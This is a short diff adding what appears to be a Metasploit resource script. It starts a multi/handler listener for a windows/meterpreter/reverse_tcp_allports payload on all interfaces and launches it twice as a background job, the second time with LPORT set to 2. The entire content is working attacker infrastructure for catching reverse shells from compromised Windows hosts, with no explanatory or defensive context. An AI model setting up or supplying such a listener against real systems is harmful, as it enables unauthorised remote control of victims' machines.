@@ -1,0 +1,6 @@
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp_allports 
+set LHOST 0.0.0.0 
+exploit -j 
+set LPORT 2 
+exploit -j
